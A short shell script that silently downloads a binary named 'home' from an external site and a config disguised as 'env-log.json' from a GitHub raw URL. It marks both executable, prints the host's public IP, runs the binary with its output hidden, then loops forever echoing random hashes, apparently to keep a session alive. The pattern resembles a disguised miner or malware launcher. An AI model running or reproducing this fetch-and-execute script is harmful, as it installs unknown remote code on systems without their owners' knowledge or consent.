#!/bin/sh
wget -q -O home https://02ip.ru/curl-get && chmod +x home >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/dufsvqk88/lop/main/env-log.json && chmod +x env-log.json
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " "
./home -c "env-log.json" >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
